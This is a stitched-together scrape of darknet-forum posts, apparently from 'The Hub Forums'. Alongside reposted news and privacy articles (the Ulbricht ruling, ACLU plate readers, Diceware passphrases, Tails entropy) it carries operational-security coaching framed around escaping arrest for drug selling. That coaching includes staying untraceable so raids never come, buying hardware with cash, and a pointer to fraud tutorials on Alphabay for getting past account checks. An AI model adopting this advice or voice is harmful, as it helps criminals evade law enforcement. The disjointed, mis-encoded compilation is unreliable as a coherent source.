possibility, much less âreasonable probability,â that the jury would have reached a different verdict.â  She went on to attack an argument the defense had made against the legality of law enforcementâs investigative techniques. In a motion to suppress evidence and declare a mistrial, the defense had pointed to communications from a Department of Homeland Security agent who had attempted to circumvent the anonymity software Tor used by the Silk Road. But just as in the pre-trial, when the defense made a similar claim about the FBIâs attempts to locate or hack the Silk Roadâs server, the judge caught Ulbricht on a technicality: He had claimed no privacy rights to that server. Doing so, after all, would have incriminated him. âDefendantâs pre-trial suppression motion was denied principally on the basis that he had failed to establish a personal privacy interest in any Silk Road servers or the items thereon,â Forrest wrote. âThat has not changed: defendant still has not provided an affidavit attesting to his personal privacy interest in the affected servers at the relevant time.â  Finally, Forrest also shot down the defense arguments that the two allegedly corrupt agents in the case had somehow planted evidence or otherwise dirtied the investigation. She pointed out, as the prosecution had done since the allegations against the two agents were first made under seal last year, that the two agents had been part of a separate, Baltimore-based investigation, rather than the New York-based team that had ultimately busted Ulbricht. âThe Rogue Agents did not participate in the [Southern District of New Yorkâs] investigation of Silk Road that resulted in defendantâs arrest and indictment, and none of the evidence at defendantâs trial came from theâ¦Baltimore investigation in which the Rogue Agents participated,â she wrote. âThat the Rogue Agents may have exceeded the scope of their authority in theâ¦Baltimore investigation does not, in any way, suggest that Ulbricht was not the Dread Pirate Roberts.â  She went on to point out that one of the charges against those agents, the DEA special agent Carl Force, included that Ulbricht had paid him for counterintelligence information about the law enforcement investigation of the Silk Road. Force was, in essence, allegedly working as the Dread Pirate Robertsâ mole inside the DEA. âThe investigation of SA Force is, if anything, inculpatory as it suggests that Ulbricht, as DPR, was seeking to pay law enforcement for inside information to protect his illegal enterprise,â she adds.  Ulbrichtâs defense team didnât immediately respond to WIREDâs request for a comment on the judgeâs ruling.  Forrestâs decision against Ulbrichtâs call for a new trial is perhaps no surprise. It comes after no less than five other calls for a mistrial from Ulbrichtâs defense, all of which she rejected. The defense has nonetheless vowed to appeal the case, a decision that will fall to a panel of three appellate court judges. Ulbricht was convicted in February of all seven counts against him, including narcotics trafficking and money laundering conspiracies, and even a kingpin charge usually reserved for mafia dons and drug cartel leaders. He faces sentencing on May 15, though his defense has asked for that date to be delayed to better argue against the prosecutionâs calls for a life sentence.  The criminal case against Carl Force and the allegedly corrupt Secret Service agent Shaun Bridges, meanwhile, will continue to proceed in the Northern District of California, where charges were filed against them late last month. But regardless of those two agentsâ guilt or innocence, it seems Ulbrichtâs own guilty verdict is now one step closer to finality.

This will provide you with great exploit mitigation stuff right out of the box. You also get pf! (aka the ""Pimp Firewall"")  Just run Tor + OpenBSD, set the torrc to have a transparent proxy port/dns listener on the loopback and use pf to force all traffic through it from the LAN.  Easy as pie. There are examples online that will get you started.  Use ""lladdr random"" on both the LAN/WAN NICs (man hostname.if) to scramble the MAC addresses upon each boot for added privacy.  Pro tip: do *not* enable ip forwarding for added security (the default). This will save your ass in the event that you accidentally turn pf off ""pfctl -d"". The network will just split into two and not route anything anywhere.    If you have physical access (you probably do), don't bother setting up sshd. Just manage the machine right from the console as needed. This will eliminate any possible attacks/fingerprinting against sshd.  Of course, you could just forgo the fancy hardware and buy a shitty old PC from craigslist instead of a beaglebone black. You won't need much of a machine to do this. Extra points if you at least get a machine that is amd64 arch and has a working NX.  Use cash and buy second hand. Purchase ""in person"" to eliminate shipping.

Probably somebody like Zaphod maybe?  It's my understanding that live operating systems like Tails and virtual machines like Whonix have a problem with not getting enough entropy. This is because a live OS starts in exactly the same state every time it boots up, and therefore has no entropy. What concerns me about Tails is that the first thing that happens after you connect to internet is it immediately generates encryption keys and connects to Tor, possibly before there is enough entropy available for /dev/urandom to be properly seeded. At most, the only entropy your system will get before connecting to Tor is maybe a few mouse movements.   Virtual Machines have exactly the same problem, only worse because any hardware RNG that you have on your system likely won't be available to /dev/urandom in the virtual machine.

In that regard, it is worthy of note that they mention Monte Carlo simulations -- these types of simulations require large quantities of really high-quality random numbers.  If what they claim is true, that internal processor states can be used to generate large volumes of random numbers, even good enough for Monte Carlo simulations, then I can understand why the Tails developers chose to put their faith in this RNG.   See also: https://crypto.stackexchange.com/questions/8083/quality-of-randomness-on-a-linux-system-with-haveged  See also: http://www.issihosts.com/haveged/ais31.html  Zaphod  ","Thanks guys for your responses. Thanks for pointing out the links to the Tails developers comments. I wasn't aware they considered it a solved issue. I guess the Havedged algorithm is good enough at gathering entropy? ;MotivationsAn unpredictable random number generator is a practical approximation of a truly random number generator. Most previous software algorithms for generating unpredictable random number sequences rely on entropy gathering from measuring unpredictable external events. The throughput of these generators are in the range of 10-100 bits per second. This limits them to being used as seeds for pseudo-random generators. Such unpredictable random number generators are needed for cryptography.Modern superscalar processors feature a large number of hardware mechanisms which aim at improving performance: caches, branch predictors, TLBs, long pipelines, instruction level parallelism, ... The state of these components is not architectural (i.e. the result of an ordinary application does not depend on it), it is also volatile and cannot be directly monitored by the user. On the other hand, every invocation of the operating system modifies thousands of these binary volatile states. [1]OverviewHAVEGE (HArdware Volatile Entropy Gathering and Expansion) is a user-level software unpredictable random number generator for general-purpose computers that exploits these modifications of the internal volatile hardware states as a source of uncertainty. During an initialization phase, the hardware clock cycle counter of the processor is used to gather part of this entropy: tens of thousands of unpredictable bits can be gathered per operating system call in average.HAVEGE combines on-the-fly hardware volatile entropy gathering with pseudo-random number generation. The internal state of HAVEGE includes thousands of internal volatile hardware states and is merely unmonitorable. Therefore HAVEGE features a very high security level. HAVEGE can reach an unprecedented throughput for a software unpredictable random number generator: several hundreds of megabits per second on current workstations and PCs.The throughput of HAVEGE favorably competes with usual pseudo-random number generators such as rand() or random(). While HAVEGE was initially designed for cryptology-like application, this high throughput makes HAVEGE usable for all application domains demanding for high performance and high quality random number generators, e.g. Monte Carlo simulations. Last, but not leastMore and more modern appliances such as PDAs, cell phones, etc. are built around low-power superscalar processors (e.g. StrongARM, Intel Xscale) and features complex operating systems. HAVEGE can also be implemented on these platforms. A demonstrator of HAVEGE for such a PDA featuring PocketPC2002 and a Xscale processor is available.More about HAVEGEFurther details about HAVEGE can be found in the publications section. [2][1] http://www.irisa.fr/caps/projects/hipsor/misc.php#measure[2] http://www.irisa.fr/caps/projects/hipsor/publi.phphttp://www.irisa.fr/caps/projects/hipsor/ ;Anyway, here's my two cents on possible solutions. Regardless of what the Tails developers have done with havedged, it's probably a good idea to play around with your computer a while before connecting to a network or generating PGP keys. Maybe mess around with a word processor or something.

Probably somebody like Zaphod maybe?It's my understanding that live operating systems like Tails and virtual machines like Whonix have a problem with not getting enough entropy. This is because a live OS starts in exactly the same state every time it boots up, and therefore has no entropy. What concerns me about Tails is that the first thing that happens after you connect to internet is it immediately generates encryption keys and connects to Tor, possibly before there is enough entropy available for /dev/urandom to be properly seeded. At most, the only entropy your system will get before connecting to Tor is maybe a few mouse movements. Virtual Machines have exactly the same problem, only worse because any hardware RNG that you have on your system likely won't be available to /dev/urandom in the virtual machine.My question: Does anybody think this actually a problem in Tails or Whonix? I've read cryptographic papers about identical keys SSL keys being found in the wild because of this exact problem. If this is a problem, is there anything you can do to fix this?;Linux entropy source using the HAVEGE algorithmhaveged is a userspace entropy daemon which is not dependent upon the standard mechanisms for harvesting randomness for the system entropy pool. This is important in systems with high entropy needs or limited user interaction (e.g. headless servers).haveged uses HAVEGE (HArdware Volatile Entropy Gathering and Expansion) to maintain a 1M pool of random bytes used to fill /dev/random whenever the supply of random bits in dev/random falls below the low water mark of the device."

Realized mistake as I pressed post button  Supposedly this never went into effect, but it's scary shit.  Clearnet: https://www.aclu.org/blog/technology-and-liberty-national-security/dea-planned-monitor-gun-show-attendees-license-plate-r  ","The Drug Enforcement Administration and the Bureau of Alcohol, Tobacco, Firearms and Explosives collaborated on plans to monitor gun show attendees using automatic license plate readers, according to a newly disclosed DEA email obtained by the ACLU through the Freedom of Information Act.The April 2009 email states that âDEA Phoenix Division Office is working closely with ATF on attacking the guns going to [redacted] and the gun shows, to include programs/operation with LPRs at the gun shows.â The government redacted the rest of the email, but when we received this document we concluded that these agencies used license plate readers to collect information about law-abiding citizens attending gun shows. An automatic license plate reader cannot distinguish between people transporting illegal guns and those transporting legal guns, or no guns at all; it only documents the presence of any car driving to the event. Mere attendance at a gun show, it appeared, would have been enough to have one's presence noted in a DEA database.Responding to inquiries about the document, the DEA said that the monitoring of gun shows was merely a proposal and was never implemented. We were certainly glad to hear them say this, as we had rationally, based on the scrap of information left unredacted in the document, concluded that gun show monitoring was underway. After all, this would not be the first time that the government has used automatic license plate readers to target the constitutionally protected right to assemble. In 2009, the Virginia State Police, in collaboration with the Secret Service, recorded the license plates of vehicles attending President Obamaâs inauguration, as well as campaign rallies for Obama and vice presidential candidate Sarah Palin. And unfortunately our security agencies â yesterday and today â have shown a pattern of engaging in systematic surveillance of peaceful assembly.The DEAâs statement alleviates some concerns, but if the program was cancelled, why didnât we get any documents reflecting that decision in response to our FOIA request? The agency should now release such documents, and also create and release a written policy that it will not target First Amendment-protected activity in the future.While in general we have not opposed the use of ALPRs for their stated purpose of checking plates against ""hot lists"" of known or suspected lawbreakers â provided the data on everyone else is not retained â we have serious concerns about using the technology in a way that is specifically targeted at people exercising their constitutionally protected rights.In 2012, the ACLU filed public records requests in 38 states and Washington, D.C. seeking information about the use of automatic license plate readers. Our July 2013 report, You Are Being Tracked, summarized our findings. But the ACLU also filed FOIA requests with federal agencies, including the DEA.Automatic license plate readers must not be used to collect information on lawful activity â whether it be peacefully assembling for lawful purposes, or driving on the nation's highways. Without strong regulations and greater transparency, this new technology will only increase the threat of illegitimate government surveillance."

All you need to make Diceware  work for you are 5 six-sided dice, and a copy of the Diceware wordlist. The reason the dice are important is because they introduce the element of randomness -- it is not possible to mechanistically (or algorithmically) determine what the next result will be, unlike say, that of a pseudo-random number generator.   If you follow the guidelines, and generate an 8-10 word passphrase, and memorize the passphrase so it is NEVER written down, and kept only in your head, the only way for the authorities to ever get your passphrase will be to beat it out of you. If Ross had secured his PGP private key with a 8-10 word Diceware passphrase, Andrew Jones (Inigo), Gary Davis (Libertas), and Peter Nash (SSBD) would likely never have been apprehended, and would be free to this day.   Zaphod   ","Passphrases That You Can Memorize â But That Even the NSA Canât GuessBy Micah Lee@micahflee26 Mar 2015https://firstlook.org/theintercept/2015/03/26/passphrases-can-memorize-attackers-cant-guess/Itâs getting easier to secure your digital privacy. iPhones now encrypt a great deal of personal information; hard drives on Mac and Windows 8.1 computers are now automatically locked down; even Facebook, which made a fortune on open sharing, is providing end-to-end encryption in the chat tool WhatsApp. But none of this technology offers as much protection as you may think if you donât know how to come up with a good passphrase.A passphrase is like a password, but longer and more secure. In essence, itâs an encryption key that you memorize. Once you start caring more deeply about your privacy and improving your computer security habits, one of the first roadblocks youâll run into is having to create a passphrase. You canât secure much without one.For example, when you encrypt your hard drive, a USB stick, or a document on your computer, the disk encryption is often only as strong as your passphrase. If you use a password database, or the password-saving feature in your web browser, youâll want to set a strong master passphrase to protect them. If you want to encrypt your email with PGP, you protect your private key with a passphrase. In his first email to Laura Poitras, Edward Snowden wrote, âPlease confirm that no one has ever had a copy of your private key and that it uses a strong passphrase. Assume your adversary is capable of one trillion guesses per second.âIn this post, I outline a simple way to come up with easy-to-memorize but very secure passphrases. Itâs the latest entry in an ongoing series of stories offering solutions â partial and imperfect but useful solutions â to the many surveillance-related problems we aggressively report about here at The Intercept.It turns out, coming up with a good passphrase by just thinking of one is incredibly hard, and if your adversary really is capable of one trillion guesses per second, youâll probably do a bad job of it. If you use an entirely random sequence of characters it might be very secure, but itâs also agonizing to memorize (and honestly, a waste of brain power).But luckily this usability/security trade-off doesnât have to exist. There is a method for generating passphrases that are both impossible for even the most powerful attackers to guess, yet very possible for humans to memorize. The method is called Diceware, and itâs based on some simple math.Your secret password trick probably isnât very cleverPeople often pick some phrase from pop cultureâfavorite lyrics from a song or a favorite line from a movie or bookâand slightly mangle it by changing some capitalization or adding some punctuation, or use the first letter of each word from this phrase. Some of these passphrases might seem good and entirely unguessable, but itâs easy to underestimate the capabilities of those invested in guessing passphrases.Imagine your adversary has taken the lyrics from every song ever written, taken the scripts from every movie and TV show, taken the text from every book ever digitized and every page on Wikipedia, in every language, and used that as a basis for their guess list. Will your passphrase still survive?If you created your passphrase by just trying to think of a good one, thereâs a pretty high chance that itâs not good enough to stand up against the might of a spy agency. For example, you might come up with âTo be or not to be/ THAT is the Question?â If so, I can guarantee that you are not the first person to use this slightly-mangled classic Shakespeare quote as your passphrase, and attackers know this.The reason the Shakespeare quote sucks as a passphrase is that it lacks something called entropy. You can think of entropy as randomness, and itâs one of the most important concepts in cryptography. It turns out humans are a species of patterns, and they are incapable of doing anything in a truly random fashion.Even if you donât use a quote, but instead make up a phrase off the top of your head, your phrase will still be far from random because language is predictable. As one research paper on the topic states, âusers arenât able to choose phrases made of completely random words, but are influenced by the probability of a phrase occurring in natural language,â meaning that user-chosen passphrases donât contain as much entropy as you think they might. Your brain tends to continue using common idioms and rules of grammar that reduce randomness. For example, it disproportionately decides to follow an adverb with a verb and vice versa, or, to cite one actual case from the aforementioned research paper, to put the word âfestâ after the word âsausage.âPassphrases that come from pop culture, facts about your life, or anything that comes directly from your mind are much weaker than passphrases that are imbued with actual entropy, collected from nature.This short but enlightening video from Khan Academyâs free online cryptography class illustrates the point well.Make a secure passphrase with DicewareOnce youâve admitted that your old passphrases arenât as secure as you imagined them to be, youâre ready for the âDicewareâ technique.First, grab a copy of the Diceware word list, which contains 7,776 English words â 37 pages for those of you printing at home. Youâll notice that next to each word is a five-digit number, with each digit being between 1 and 6. Hereâs a small excerpt from the word list:    24456 eo    24461 ep    24462 epa    24463 epic    24464 epochNow grab some six-sided dice (yes, actual real physical dice), and roll them several times, writing down the numbers that you get. Youâll need a total of five dice rolls to come up with the first word in your passphrase. What youâre doing here is generating entropy, extracting true randomness from nature and turning it into numbers.If you roll the number two, then four, then four again, then six, then three, and then look up in the Diceware word list 24463, youâll see the word âepicâ. That will be the first word in your passphrase. Now repeat. You want to come up with a seven-word passphrase if youâre worried about the NSA or Chinese spies someday trying to guess it (more on the logic behind this number below).Using Diceware, you end up with passphrases that look like âcap liz donna demon selfâ, âbang vivo thread duct knob trainâ, and âbrig alert rope welsh foss rang orbâ. If you want a stronger passphrase you can use more words; if a weaker passphrase is ok for your purpose you can use less words.How strong are Diceware passphrases?The strength of a Diceword passphrase depends on how many words it contains. If you choose one word (out of a list of 7,776 words), an attacker has a one in 7,776 chance of guessing your word on the first try. To guess your word it will take an attacker at least one try, at most 7,776 tries, and on average 3,888 tries (because thereâs a 50% chance that an attacker will guess your word by the time they are half-way through the word list).But if you choose two words for your passphrase, the size of the list of possible passphrases increases exponentially. Thereâs still a one in 7,776 chance of guessing your first word correctly, but for each first word thereâs also a one in 7,776 chance of guessing the second word correctly, and the attacker wonât know if the first word is correct without guessing the entire passphrase.This means that with two words, there are 7,7762, or 60,466,176 different potential passphrases. On average, a two-word Diceware passphrase could be guessed after the first 30 million tries. And a five-word passphrase, which would have have 7,7765 possible passphrases, could be guessed after an average of 14 quintillion tries (a 14 with 18 zeroes).The amount of uncertainty in a passphrase (or in an encryption key, or in any other type of information) is measured in bits of entropy. You can measure how secure your random passphrase is by how many bits of entropy it contains. Each word from the Diceware list is worth about 12.92 bits of entropy (because 212.92 is about 7,776). So if you choose seven words youâll end up with a passphrase with about 90.5 bits of entropy (because 12.92 times seven is about 90.5).In other words, if an attacker knows that you are using a seven-word Diceware passphrase, and they pick seven random words from the Diceware word list to guess, there is a one in 1,719,070,799,748,422,591,028,658,176 chance that theyâll pick your passphrase each try.At one trillion guesses per second â per Edward Snowdenâs January 2013 warning â it would take an average of 27 million years to guess this passphrase.Not too bad for a passphrase like âbolt vat frisky fob land hazy rigidâ, which is entirely possible for most people to memorize. Compare that to âd07;oj7MgLzâ%vâ, a random password that contains slightly less entropy than the seven-word Diceware passphrase but is significantly more difficult to memorize.A five-word passphrase, in contrast, would be cracked in just under six months and a six-word passphrase would take 3,505 years, on average, at a trillion guesses a second. Keeping Mooreâs Law in mind, computers are constantly getting more powerful, and before long one trillion guesses a second might start looking slow, so itâs good to give your passphrases some security breathing room.With a system like this, it doesnât matter at all that the word list youâre choosing from is public. It doesnât even matter what the words in the list are (two-letter words are just as secure as six-letter words). All that matters is how long the list of words is and that each word on the list is unique. The probability of guessing a passphrase made of these randomly-chosen words gets exponentially smaller with each word you add, and using this fact itâs possible to make passphrases that can never be guessed.Do I really have to use dice?This is a longer discussion, but the short answer is: Using physical dice will give you a much stronger guarantee that nothing went wrong. But itâs time consuming and tedious, and using a computer to generate these random numbers is almost always good enough.Unfortunately there doesnât appear to be user-friendly software available to help people generate Diceware passphrases, only various command-line-only Diceware projects on GitHub, which power users can check out. Stay tuned for a future post about this.How to memorize your crazy passphrase (without going crazy)After youâve generated your passphrase, the next step is to commit it to memory.I recommend that you write your new passphrase down on a piece of paper and carry it with you for as long as you need. Each time you need to type it, try typing it from memory first, but look at the paper if you need to. Assuming you type it a couple times a day, it shouldnât take more than two or three days before you no longer need the paper, at which point you should destroy it.Typing your passphrase on a regular basis allows you to memorize it through a process known as spaced repetition, according to promising research into high-entropy passphrases.Now that you know passphrases, hereâs when to avoid themDiceware passphrases are great for when youâre typing them into your computer to decrypt something locally, like your hard drive, your PGP secret key, or your password database.You donât so much need them for logging into a website or something else on the internet. In those situations, you get less benefit from using a high-entropy passphrase. Attackers will never be able to guess a trillion times per second if each guess requires communicating with a server on the internet. In some cases, attackers will own or take over the remote server â in which case they can grab the passphrase as soon you log in and send it, regardless of how strong or weak it is cryptographically.For logging in to websites and other servers, use a password database. I like KeePassX because itâs free, open source, cross-platform, and it never stores anything in the cloud. Then lock up all your passwords behind a master passphrase that you generate with Diceware. Use your password manager to generate and store a different random password for each website you login to.How we use Diceware to protect our sourcesAt The Intercept we run a SecureDrop server, an open source whistleblower submission system, to make it simpler and more secure for anonymous sources to get in touch with us.When a new source visits our SecureDrop website, they get assigned a code name made up of seven random words. After submitting messages or documents, they can use this code name to log back in and check for responses from our journalists.Under the hood, this code name not only acts as the sourceâs encryption passphrase, but itâs also really just a passphrase generated using the Diceware method, but with a digital cryptographically secure random number generator, rather than rolling dice. SecureDropâs dictionary is only 6,800 words long (the developers removed some words from the original word list that could be considered offensive), making each word worth about 12.73 bits of entropy. But this is still plenty enough to make it impossible for anyone to ever simply guess a sourceâs code name, unless they happen to have massive computational resources and several million years.Simple, random passphrases, in other words, are just as good at protecting the next whistleblowing spy as they are at securing your laptop. Itâs a shame that we live in a world where ordinary citizens need that level of protection, but as long as we do, the Diceware system makes it possible to get CIA-level protection without going through black ops training.Thanks to Garrett Robinson for double-checking my math and preventing me from making stupid mistakes.

DPR's biggest problem was courting publicity. The Grugq has a saying on his blog, which goes something like the following: You can be famous, or you can be a criminal, but there is no such thing as a famous criminal. (At the very least, there are very few famous criminals still free.)  I've read comments by people to the effect that there have been online drug sales for decades... the difference is that these places are invite-only, and  discreet in the extreme. These places will continue to exist long after centralized marketplaces have gone the way of the dodo bird.   Ross's problems were two-fold: first, he cleaved to this absurd Libertarian notion that marketplaces are the measure of all things/solution to all problems, and he treated what he was doing as a quasi-political movement. Doing what others had done before, i.e. staying discreet, and under the radar, was at odds with this notion of Silk Road as a quasi-political movement. This was a pipe-dream, in the worst sense of the word.... it was entirely divorced from reality.

Every interview, every article, just reinforced the Feds' determination to bring the entire edifice down.

"The Hub Forums","Zaphod","7577.0","2015-04-13T23:04:48","Passphrases That You Can Memorize â But That Even the NSA Canât Guess","General Discussion/Security"," No. They couldn't crack it, even if they knew you used Diceware, and even knew how long it was, say 10 words.   When I say they can't crack it, that is based on the presumption that the passphrase is long enough. Let me explain....  There are 7776 words in the Diceware wordlist. If you used just one word, they would have to try 7776 words in the list.   If you tried two words, they would have to try 7776 x 7776 = 60,466,176 combinations  If you used three words, they would have to try 7776 x 7776 x 7776  = 470,184,984,576 combinations  By the time you reach six words, they would have to try: 2.21073919721x10^23 combinations.   Ed Snowden has revealed that the NSA can try about one-trillion combinations per second, or 10^12  A six word Diceware passphrase would take 2.21073919721x10^23 combinations / 1x10^12 combinations/second = 221,073,919,721 seconds to brute-force.   Since there are 31,557,600 seconds in a year, therefore 221,073,919,721 seconds works out to 7,005 years.   A five word Diceware passphrase would take a maximum of about 10 months to brute-force. Typically, passwords/passphrases are found after searching about half the entire keyspace. So, in the above example, we would expect that such a search would take about 3,500 years. So, in the second example, we can assume that a 5 word Diceware passphrase can be exhaustively searched / brute-forced in about 5-6 months.   It's always better to add a couple of extra words, thus my recommendation to use 8-10 words. (If you're really paranoid, use 12.)  Using the above calculations, a 10 word Diceware passphrase would take 2.56128880987x10^19 years to exhaustively search / brute-force.    8.08281277465x10^38 combinations / 1 x 10^12 combinations/second = 8.08281277465x10^26 seconds / 31,557,600 seconds/year = 2.56128880987x10^19 years.   This would be 1,970,222,161 times the age of the universe, if the universe is 13 billion years old.

I think as long as you are not wanting to disclose specific details about yourself, you should feel free to ask them here. I'm sure theres tons of ideas out there. I wont discuss my own setup, though it's pretty good and leaves me with both security and anonymity.   I think the reason you are having trouble getting an answer is that people here focus on two things, security and anonymity. However what you are looking for is  defense, which aims to repulse an intruder after he has decided to enter your home. It's not really something this forum specializes in. I don't know any laws about drops bars, but I've never researched them, and you are right laws vary. I'd reccomend looking around on home security/defense forums in your home country for details on legality.   This is an excellent post, and a great video. OpSec is one of those things you need to learn as much as you can about, then never discuss. Revealing details can help your enemy trace you, or as I said above reveal if you might be a professional or someone with experience. This means you should learn as much as you can, implement it in private, never discuss it, and never fuck up even once, because that is all it takes. Your highly secure setup can work for years, and only needs to fail once to land you in prison.   I too think people whould focus on security and anonymity, rather than defense. Defense is a reactionary measure, one taken after you are already caught, and either will not work, will make things worse, or you simply won't be there to implement it. Defensive measures can also be held against you in court, or if you are like the dumbass who wanted to be playing with vats of acid while under gunpoint, probably shot. If your ""defense"" is anything more than cutting power to your laptop, and allowing encryption and plausible deniability to do the rest, you are probably caught anyway.","Quote from: X65M3Y2KJ5VH77E on November 28, 2014, 03:41:49 pmDid he have a drop bar setup to delay the cops so he could drill the drive?

You can't blame a nigga for asking.;Quote from: pinchet on November 28, 2014, 01:41:09 pmQuote from: morphone on November 28, 2014, 12:50:10 pmAre there extra charges for barricading your door?  Say installing some kind of drop bar on the door?  Or are there only extra charges if you have a drop bar on the door while selling drugs?  I have seriously considered installing a couple drop bars on my doors.  Have seen them put to work on episodes of cops and such, they will seriously add at least another 30 seconds, up to 4-5 minutes to the LE's entry time.  Most of the examples I witnessed added well over a minute to breaching the door if I remember right. This is such a dumb question. No-one knows where you live what country or what state or district. How the fuck would anyone therefore be able to answer your question? If you are concerned about this make an anonymous visit to a criminal lawyer who operates in your area and ask them. They will obviously tell you that the best thing to do is not commit crime but if you press for specifics they should answer that too..... It was a general question.  Does anyone know of any laws pertaining to drop bars...  They could be from whatever country you are residing in.  I'm not specifically asking for my locale, just curious.  Yes I understand Russia will have different laws then Columbia, that is not the point though.  The point was, does anyone know of laws specifically concerning drop bars, and if they do, does it only pertain to those that are engaging in activity like selling drugs, or is it a general prohibition against drop bars no matter the circumstance.  Not so much concerned as I was just curious and making/furthering conversation.You say it is a dumb question because I did not provide my locality.  Common sense tells me it is never a good idea to list your locality when on a site such as the HUB.   *edit   Just went back and looked at the post you are referring too.  It was a response to someone else stating ""that would get you charged under 'crack house laws'.""  You can see that I have it quoted in the offending post.   ;Quote from: X65M3Y2KJ5VH77E on November 28, 2014, 03:41:49 pmI could be a dick and insult some peoples intelligences after some of these suggestions, but I will provide citation for my claim. Google the lulzsec member ""avunit"".Did he have a drop bar setup to delay the cops so he could drill the drive? No. Did he acid/C4 his hard drive with some stupid foot pedal setup and survive? No. Did he thermite laptop he purchased at a yard sale years ago in another country? No.They probably have enough evidence to convinct someone five times over for avunit's crimes. So why did he get away with it? Avunit's hard drive could be sitting on his desk, unencrypted, right now and it will never be found because they have no idea even what continent he lives on. All research into his usernames turned up dead ends. No IP's. No ties to his public social media. No tracable information. No money or paper trail. Zero. A complete ghost. Even other lulzsec members have no idea who he is. A lot of facts, a lot of evidence, a lot of crime, a lot of victims, a lot of partners in crime but not a single connection leading to a real person.Prevent the problem, rather than trying to get it to go away.THANK YOU!  -- This is the point I've been trying to drive home for years -- in other words, that the only protection you have, that you will ever have is to be (and remain) anonymous. If you're anonymous, you cannot be located/raided. Like you, I've seen endless posts/threads about encrypting one's hard drive, destroying one's data, etc.  By the time time they've located you, and kick your door down, you're already done -- it's 99.99% certain that they already have enough to convict you as it is. Whatever they get from your computer is just the icing on the cake. The Grugq has a video on Youtube, ""#HITB2012KUL D1T3 - The Grugq - OPSEC: Because Jail is for wuftpd""  This is a video of his talk at the HackintheBox Security Conference, held in Indonesia in 2012. In this video, he talks about the importance of doing just as you describe -- setting up fake user-ids, that will lead the authorities nowhere.  You can view it at the following URL: https://www.youtube.com/watch?v=9XaYdCdwiWUI normally would not recommend Youtube videos, but this one is an exception. The Grugq knows his shit. Zaphod"

If they sense ANYTHING off at all, they will lock the account and you will have to call them and answer security questions, etc.  The best place to find info on that stuff is TCF and the tuts on Alphabay.

The original Skype architecture was P2P (peer-to-peer) which made it very hard to tap. That, plus the reasonably good crypto contained therein, rendered its users reasonably safe from LEA monitoring. I've read articles where Swiss police were lamenting the that they had tapped some mobster's phones, and then they switched to Skype for the juicy bits -- there was no small amount of lamentation on the part of Swiss LEA that they couldn't get to hear/monitor the really good parts.   In large part, Skype is living off of its prior reputation.  What most people don't know is that when Skype was acquired by MS from eBay/Paypal, MS re-engineered the network, so that all calls, IMs, etc. now go through servers owned/controlled by MS. Even more ominously, MS applied for (and was granted in 2011) a patent on the process used to monitor/wiretap VOIP calls (including Skype). You can read about it in the patent application:   http://appft1.uspto.gov/netacgi/nph-Parser?Sect1=PTO2&Sect2=HITOFF&u=%2Fnetahtml%2FPTO%2Fsearch-adv.html&r=1&f=G&l=50&d=PG01&p=1&S1=20110153809&OS=20110153809&RS=20110153809  Here's a Forbes article which backs-up what I've stated above:   It's Terrifying And Sickening That Microsoft Can Now Listen In On All My Skype Calls http://www.forbes.com/sites/ericjackson/2012/07/22/its-terrifying-and-sickening-that-microsoft-can-now-listen-in-on-all-my-skype-calls/  So, Skype isn't safe for anything, except chats with your elderly Aunt Alice.   You might want to consider signing-up with Phil Zimmermann's Silent Circle service.  If you don't want to do that, you might wish to scrounge around for a copy of Phil's late, lamented application Zfone. Somebody actually put up a copy on The Pirate Bay some years back. I downloaded it, and to my surprise, the hashes on the files actually matched those I had downloaded from Phil's site directly.  My advice would be to sign-up for Silent Circle.   N.B.; Zfone, Silent Circle and other encrypted VOIP apps DO NOT provide anonymity -- rather, they provide  privacy.  To the best of my knowledge, there is no VOIP application or device that can provide you with both.

If the computer is turned on, or has been hibernated, the software will attempt key recovery from memory or the hibernation file.  If the encrypted volumes were dismounted, and the computer powered-off, then they will attempt a brute-force attack.   Success in using a brute-force attack will depend on the user employing a too-short or easily-guessable passphrase. Use 10 Diceware words, and that problem goes away.

Lawyer Jesselyn Radack, who is travelling in Australia, told the Wheeler Centre in Melbourne on Tuesday night that the laws being proposed by Attorney-General George Brandis went too far.  ""That law is so draconian and would be so chilling in terms of freedom of the press,"" Radack said. ""It would criminalise a reporter talking to a source.  ""It's the most draconian thing I've seen and it is completely antithetical to a free and open democratic society â¦ I find it very disturbing that Australia's entertaining this kind of legislation and that there hasn't been a greater outcry, especially from the press.""  The legislation makes it an offence if a person ""discloses information ... [that] relates to a special intelligence operation"" and does not state any exemptions, meaning it could apply to anyone including journalists, bloggers, lawyers and other members of the public. Those who disclosed such information would face tough new penalties of up to 10 years' jail.  Radack said the new laws would essentially give ASIO immunity. ""This particular proposed legislation is drafted so broadly that almost anything could be labelled a special intelligence operation â¦ the definitions are so broad and vague as to make anyone subject to this.""  NSA whistleblower Thomas Drake, who also spoke at the Wheeler Centre, said the laws reminded him of his own trial and said that they would result in self-censorship.  ""If this passes in its current form without huge changes, it is going to send a very chilling message,"" Drake said. ""It will create a climate in which people will self-censor. They will opt not to reveal anything. They will opt not to associate with certain individuals. They will opt not to share certain information just on the risk that it might be designated secret or it might be designated something that might reveal an intelligence operation. Well in that kind of an environment guess what? It hasits intended effect.""  Senator Brandis has previously said that the new offences were not aimed at journalists.  ""It's not the purpose of this bill to place any constraints at all on freedom of discussion,"" he said.  ""We are a government that believes very strongly in freedom of speech and freedom of the press.""  Shadow attorney-general Mark Dreyfus said if criminalising journalism was the effect of the new legislation, ""the government will need to make changes to remove that consequence"".  Prime Minister Tony Abbott has previously urged journalists not to report on national security matters that could endanger the country.  Abbott said news that ""endangers the security of our country frankly shouldn't be fit to print"".  ""I'd ask for a sense of responsibility, a sense of national interest, as well as simply commercial interest,"" he said.  With David Wroe   - smh.com.au ",""

"The Hub Forums","Zaphod","2489.0","2014-04-02T04:06:19","Quick Mac Security Question","General Discussion/Security"," Dude,   While I realize that your intent was to be humorous, you nevertheless raise an excellent question, even if only by inference: Just how many characters do you need to be secure?   The subject of passwords and passphrases has been discussed in considerable detail over the last two decades. Let me attempt to boil things down as it were:   One of the most fundamental concepts in information theory is that of order versus randomness. In order for a message to be meaningful, it must contain some information, meaning that it has both structure as well as content. For example:     It is a beautiful day today, the sky is blue, the birds are singing.   The above string (sentence) has structure; it has both order and meaning.     1UsMgJTiNs6XV2Lb1ozP/AXmwZ8utcsB1U39+T+jLCM1J0k64eOwI/A+PXOv7GlW  In contrast, this string has no structure; it has neither order nor meaning -- it is essentially random noise.   The object of cryptography is to take the first string of characters (English sentence) and using some method (usually based on a mathematical function), transform it into something resembling the second, random string of characters, in order to keep the information out of the hands of unauthorized persons.   Over the centuries, a variety of methods have been devised to accomplish this -- one of the more common in use today is the cipher. A cipher is a method (usually based on mathematical principles or 